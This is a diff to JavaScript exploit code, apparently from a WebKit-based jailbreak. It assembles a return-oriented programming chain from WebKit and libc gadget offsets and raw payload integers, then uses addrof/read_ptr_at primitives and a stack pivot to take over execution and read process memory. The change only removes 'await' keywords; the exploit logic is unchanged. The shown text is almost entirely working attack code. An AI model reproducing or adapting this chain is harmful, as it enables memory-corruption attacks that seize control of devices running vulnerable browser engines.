@@ -1,7 +1,7 @@
 async function jb(){
     localStorage.setItem('fail_times', fail_times+1)
     var ropchain_array = new Uint32Array(99742);
-var ropchain = read_ptr_at(await addrof(ropchain_array)+0x10);
+var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
 var ropchain_offset = 2;
 function set_gadget(val) {
     const low = val | 0;
@@ -8563,11 +8563,11 @@ db([0, 1]); set_gadget(libc_base+471355,); db([0, 0]); set_gadgets([
 webkit_base + 0x3cf3f4,
 libc_base+11 ]);
 db([67, 0]); db([514, 0]); set_gadget(ropchain+397272,); db([59, 0]); set_gadget(libc_base+792472,); db([0, 0]); set_gadget(webkit_base+3750700,); db([514, 0]); db([0, 0]); set_gadget(ropchain+397224,); db([2303219542, 1032669414, 10, 3000, 1594167040, 2336801630, 922683510, 1208514303, 67158471, 1213267968, 136594571, 63679, 2962049024, 22286000, 698, 2156742656, 55200, 3797537023, 1214144477, 829748869, 76236901, 37, 1082869760, 1082869768, 277563464, 12699464, 2902458370, 259571845, 262205, 1208513280, 12715207, 3791650816, 3284152810, 4202255]);
-await pivot(ropchain);
-var main_ret = await read_ptr_at(main_ret);
+pivot(ropchain);
+var main_ret = read_ptr_at(main_ret);
 await sleep(1000);
-var printf_buf_end = await read_ptr_at(ropchain+printf_buf_offset);
-var printf_ans = await read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
+var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
+var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
     var _ = malloc_nogc.pop();
     var _ = malloc_nogc.pop();
     var _ = malloc_nogc.pop();
